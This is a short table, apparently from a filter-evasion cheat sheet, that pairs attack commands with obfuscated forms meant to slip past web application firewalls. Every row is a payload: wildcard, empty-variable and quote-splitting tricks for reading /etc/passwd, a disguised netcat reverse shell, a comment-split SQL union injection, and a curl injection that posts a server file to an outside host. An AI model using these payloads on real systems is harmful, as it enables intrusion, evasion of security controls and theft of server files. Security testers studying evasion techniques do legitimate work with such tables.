Description | Command | Obfuscated
- | - | -
Wildcard evasion | /bin/cat /etc/passwd | /???/??t /???/p??s??
Wildcard reverse shell | nc -e /bin/bash 127.0.0.1 1337 | /???/n? -e /???/b??h 2130706433 1337
Empty variable evasion | cat /etc/passwd | /cat$u /etc$u/passwd$u
SQL Injection comment | /?id=1+union+select+1,2,3-- | /?id=1+un/&ast;&ast;/ion+sel/&ast;&ast;/ect+1,2,3--
String literal concatenation | /bin/cat /etc/passwd | /b'i'n/ca't' /'e'tc/'pa'sswd
String literal concatenation | /bin/cat /etc/passwd | /b\i\n/ca\t\ /\e\tc/\pa\sswd
Enumerate files | echo /etc/passwd | echo /???/??ss??
File in POST request (curl injection) | curl -d @/usr/local/.../index.php 1.1.1.1:1338 | site.com/page.php?zzz=-d+%40/usr/local/.../index.php+1.1.1.1:1337"
